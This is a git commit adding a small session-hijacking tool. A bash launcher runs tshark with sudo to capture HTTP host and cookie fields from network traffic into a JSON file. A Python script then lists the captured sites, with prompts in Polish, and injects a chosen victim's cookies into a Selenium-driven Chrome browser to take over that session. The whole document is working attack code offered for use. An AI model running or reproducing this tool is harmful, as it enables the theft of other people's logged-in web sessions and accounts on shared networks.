1747ebd68b9e755548f2e3ece1c26a5853af0647
Jakub Malinowski <jakubbmalinowski@gmail.com>
2018-10-28 20:44:45 +0100

    Jedyny

---
+++ inject.py
@@ -0,0 +1,30 @@
+import json
+import sys
+from selenium import webdriver
+
+
+print("Dostepne strony: ")
+
+
+with open('data.json') as f:
+    data = json.load(f)
+
+    for index, ent in enumerate(data):
+        if not ent["_source"]["layers"]:
+            continue
+        print index,":", ent["_source"]["layers"]["http.host"][0].encode("ascii","replace")
+
+    id = input('Wybierz ID:')
+
+    host = data[id]["_source"]["layers"]["http.host"][0].encode("ascii","replace")
+    raw_cookie = data[id]["_source"]["layers"]["http.cookie"][0].encode("ascii","replace")
+    cookies = raw_cookie.split("; ")
+
+    driver = webdriver.Chrome()
+    driver.get("http://"+host+"/")
+
+    for c in cookies:
+        temp = c.split("=")
+        driver.add_cookie({'name':temp[0], 'value':temp[1], 'path':'/'})
+
+    print("Odswiez przegladarke")
---
+++ launcher.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+sudo  tshark -d tcp.port==8888:3,http -T json -e http.host -e http.cookie -l --no-duplicate-keys -a duration:$1 | tee data.json &
+wait
+python inject.py
